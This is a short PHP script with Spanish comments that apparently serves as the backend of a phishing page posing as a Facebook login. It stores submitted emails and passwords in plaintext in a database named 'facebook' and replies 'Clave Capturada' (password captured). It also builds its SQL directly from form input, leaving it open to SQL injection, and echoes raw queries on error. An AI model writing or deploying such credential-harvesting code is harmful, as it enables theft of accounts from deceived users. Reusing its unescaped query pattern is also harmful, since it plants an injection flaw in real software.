<?php

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "facebook";

// Creo la conexion hacia mysql
$conn = new mysqli($servername, $username, $password, $dbname);

// Chequeo la conexion
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Insert user and password into "usuarios" table
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    // inserto los datos traidos del formulario en la tabla usuarios
    $sql = "INSERT INTO usuarios (email, password) VALUES ('$email', '$password')";

    if ($conn->query($sql) === TRUE) {
        // Genero un select para traerme el total de usuarios de la tabla
        echo 'Clave Capturada';
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }
}
// cierro la conexion al motor mysql
$conn->close();
